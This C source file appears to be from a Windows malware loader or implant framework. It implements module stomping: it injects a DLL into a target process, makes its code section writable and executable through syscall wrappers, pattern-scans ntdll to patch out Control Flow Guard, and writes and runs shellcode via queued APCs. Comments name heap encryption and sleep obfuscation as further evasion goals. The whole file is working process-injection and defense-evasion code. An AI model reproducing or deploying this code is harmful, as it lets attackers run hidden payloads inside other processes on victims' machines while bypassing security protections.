// Module stomping (CFG bypass) & Heap encryption
// TODO: Sleep obfuscation

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <unwin.h>

#include <stdio.h>
#include <stdint.h>
#include <time.h>
#include <libgen.h>

#include "../syscalls/syscalls.h"
#include "../debugging/debugging.h"
#include "memory.h"

#define THREAD_WAIT 5
#define SECTION_DATA(base, section) (base + section->VirtualAddress)
#define ENTRYPOINT(base, ntHeader) (base + ntHeader->OptionalHeader.AddressOfEntryPoint)
#define RANDOM_ADDR(MAXADDR, MINADDR) (LPVOID)(rand() % (MAXADDR + 1 - MINADDR) + MINADDR)

extern Ade GlobalAde;

typedef struct TEMP_ALLOC_VALUES {
    LPVOID ptr;
    SIZE_T size;
} TEMP_ALLOC_VALUES;

typedef struct PE_MODULE {
    PBYTE base;
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    PIMAGE_SECTION_HEADER textSection;
} PE_MODULE;

char CFGPatch[] = {
    0xff, 0xe0, // jmp rax
    0x90, 0x90, 0x90
};

char LdrpDispatchUserCallTarget[] = {
    0x49, 0xC1, 0xEA, 0x09 // shr r10, 9
};

char CFGToPatch[] = {
    0xE9 // JMP (addr) ??
};

LPVOID RtlMoveMemoryAPC(HANDLE hproc, HANDLE hthread, PVOID dest, PVOID data, SIZE_T dataLen) {
    LPVOID ptrData = VirtualAllocEx(
        hproc,
        NULL,
        dataLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!WriteProcessMemory(
        hproc,
        ptrData,
        data,
        dataLen,
        NULL
    )) {
        return NULL;
    }

    NtQueueApcThread(
        hthread,
        (LPVOID)GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlMoveMemory"),
        dest,
        ptrData,
        (void*)dataLen 
    );

    return ptrData;
}

HANDLE LoadRemoteModule(HANDLE hproc, char* pathTargetModule, size_t sizePathTargetModule) {
    HANDLE hThread;
    PVOID remoteParameters = VirtualAllocEx(
        hproc,
        NULL,
        sizeof(pathTargetModule),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remoteParameters == NULL) {
        return NULL;
    }

    if (!WriteProcessMemory(
        hproc,
        remoteParameters,
        pathTargetModule,
        sizePathTargetModule,
        NULL
    )) {
        return NULL;
    }

    PVOID LoadLibraryAddr = GetProcAddress(
        GetModuleHandle("kernel32"),
        "LoadLibraryA"
    );

    if (!(hThread = CreateRemoteThread(
        hproc,
        NULL,
        0,
        (PTHREAD_START_ROUTINE)LoadLibraryAddr,
        remoteParameters,
        0,
        NULL
    ))) {
        return NULL;
    }

    return hThread;
}

PVOID getPattern(char* pattern, SIZE_T pattern_size, SIZE_T offset, PVOID base_addr, SIZE_T module_size)
{
	PVOID addr = base_addr;
	while (addr != (char*)base_addr + module_size - pattern_size)
	{
		if (memcmp(addr, pattern, pattern_size) == 0)
		{
			return (char*)addr - offset;
		}
		addr = (char*)addr + 1;
	}

	return NULL;
}

HANDLE GetHandleModuleByProc(HANDLE hproc, char* nameTargetModule) {
    HMODULE modules[1024];
    CHAR nameRemoteModule[MAX_PATH];
    DWORD modulesSizeNeeded = 0;

    if (!EnumProcessModules(hproc, modules, sizeof(modules), &modulesSizeNeeded)) {
        return NULL;
    }

    int moduleCount = modulesSizeNeeded / sizeof(HMODULE);
    
    for (int i = 0; i < moduleCount; i++) {
        HMODULE module = modules[i];
        GetModuleBaseNameA(hproc, module, nameRemoteModule, sizeof(nameRemoteModule));
        if (strcmp(nameRemoteModule, nameTargetModule) == 0) {
            return module;
        }
    }

    return NULL;
}

WINBOOL ParseModule(HANDLE hproc, HMODULE hTargetModule, PE_MODULE* peModule) {
    const DWORD headerBufferSize = 0x1000;

    LPVOID targetPeHeaders = malloc(headerBufferSize);
    if (!ReadProcessMemory(
        hproc,
        hTargetModule,
        targetPeHeaders,
        headerBufferSize,
        NULL
    )) {
        return FALSE;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetPeHeaders;
    PIMAGE_NT_HEADERS ntHeader  = (PIMAGE_NT_HEADERS)((PBYTE)targetPeHeaders + dosHeader->e_lfanew);

    peModule->base          = (PBYTE)hTargetModule;
    peModule->dos           = dosHeader;
    peModule->nt            = ntHeader;
    peModule->textSection   = IMAGE_FIRST_SECTION(ntHeader);

    return TRUE;
}

WINBOOL ModuleStomping(
    HANDLE hproc,
    char* pathTargetModule,
    PBYTE shellcode,
    size_t sizeShellcode,
    size_t sizePathTargetModule,
    MODULE_STOMPING* moduleStompingOut
) {
    TEMP_ALLOC_VALUES tempAllocValues;
    ULONG shellcodOldProtection;
    ULONG CFGOldProtection;
    AdeSinner sinner;

    HANDLE ThreadLoadLibrary = LoadRemoteModule(hproc, pathTargetModule, sizePathTargetModule);
    if (!ThreadLoadLibrary) {
        DEBUG_ERROR("ThreadLoadLibrary")
        return FALSE;
    }

    WaitForSingleObject(ThreadLoadLibrary, INFINITE);

    CHAR* nameTargetModule = basename(pathTargetModule);
    HMODULE hTargetModule = GetHandleModuleByProc(hproc, nameTargetModule);

    if (!hTargetModule) {
        DEBUG_SERROR("GetHandleModuleByProc", "", "Module not found")
        return FALSE;
    }

    PE_MODULE peModule;
    if (!ParseModule(hproc, hTargetModule, &peModule)) {
        DEBUG_SERROR("ParseModule", "", "Unable parse the module")
        return FALSE;
    }

    LPVOID textSectionData = SECTION_DATA(hTargetModule, peModule.textSection);
    INT textSectionSizeOf = peModule.textSection->Misc.VirtualSize;

    if (textSectionSizeOf < sizeof(shellcode)) {
        DEBUG_SERROR("", "", ".text section is too small")
        return FALSE;
    }

    // [ CFG: Search for addr to patch ]
    LPVOID CFGAddrToPatch;

    {
        LPVOID pRtlRetrieveNtUserPfn = GetProcAddress(GetModuleHandleA("ntdll"), "RtlRetrieveNtUserPfn");

        // Search function
        LPVOID pLdrpDispatchUserCallTarget = getPattern(
            LdrpDispatchUserCallTarget,
            sizeof(LdrpDispatchUserCallTarget),
            0,
            pRtlRetrieveNtUserPfn,
            0xfff
        );

        if (pLdrpDispatchUserCallTarget == 0) {
            DEBUG_LHERROR("getPattern", "Pattern not found", pLdrpDispatchUserCallTarget)
            return FALSE;
        } 

        // Search single instruction
        CFGAddrToPatch = getPattern(
            CFGToPatch,
            sizeof(CFGToPatch),
            0,
            pLdrpDispatchUserCallTarget,
            0xfff
        );
    }

    // [ Get a alloc addr ]

    srand(time(NULL));
    LPVOID ptrEntryShellcode = RANDOM_ADDR(
        (DWORD64)(textSectionData + textSectionSizeOf), 
        (DWORD64)textSectionData);

    // [ Changing entrys PERMS to RWX ]

    tempAllocValues.ptr = ptrEntryShellcode;
    tempAllocValues.size = sizeShellcode;
    CallAde(sinner, "NtProtectVirtualMemory", NTSTATUS status,
        hproc,
        &tempAllocValues.ptr,
        &tempAllocValues.size,
        PAGE_EXECUTE_READWRITE,
        &shellcodOldProtection
    )

    if (status != 0x0) {
        DEBUG_HERROR("VirtualProtectEx", "(shellcode: RWX)", status)
        return FALSE;
    }

    tempAllocValues.ptr = CFGAddrToPatch;
    tempAllocValues.size = sizeof(CFGPatch);
    CallAde(sinner, "NtProtectVirtualMemory", status,
        hproc,
        &tempAllocValues.ptr,
        &tempAllocValues.size,
        PAGE_EXECUTE_READWRITE,
        &CFGOldProtection
    )

    if (status != 0x0) {
        DEBUG_HERROR("VirtualProtectEx", "(CFG Patch: RWX)", status)
        return FALSE;
    }

    // Add a suspended thread for init the execution chain

    HANDLE hthread = CreateRemoteThread(
        hproc,
        FALSE,
        0,
        (PTHREAD_START_ROUTINE)ExitThread,
        NULL,
        CREATE_SUSPENDED,
        NULL
    );

    // Add the APC to the execution chain

    RtlMoveMemoryAPC(
        hproc,
        hthread,
        ptrEntryShellcode,
        shellcode,
        sizeShellcode
    );

    RtlMoveMemoryAPC(
        hproc,
        hthread,
        CFGAddrToPatch,
        CFGPatch,
        sizeof(CFGPatch)
    );

    ResumeThread(hthread);
    WaitForSingleObject(hthread, INFINITE);

    // [ Changing entrys PERMS to old PERMS ]

    tempAllocValues.ptr = ptrEntryShellcode;
    tempAllocValues.size = sizeof(sizeShellcode);
    CallAde(sinner, "NtProtectVirtualMemory", status,
        hproc,
        &tempAllocValues.ptr,
        &tempAllocValues.size,
        shellcodOldProtection,
        &shellcodOldProtection
    )

    if (status != 0x0) {
        DEBUG_HERROR("VirtualProtectEx", "(shellcode: RX)", status)
        return FALSE;
    }

    tempAllocValues.ptr = CFGAddrToPatch;
    tempAllocValues.size = sizeof(CFGPatch);
    CallAde(sinner, "NtProtectVirtualMemory", status,
        hproc,
        &tempAllocValues.ptr,
        &tempAllocValues.size,
        CFGOldProtection,
        &CFGOldProtection
    )

    if (status != 0x0) {
        DEBUG_HERROR("VirtualProtectEx", "(CFG Patch: RX)", status)
        return FALSE;
    }

    // [ END ]

    moduleStompingOut->executionAddr = ptrEntryShellcode;

    return TRUE;
}

// Stack & Heap encryption 
VOID TimerPastaAlPestoEPomodoro(ULONG time) {

}
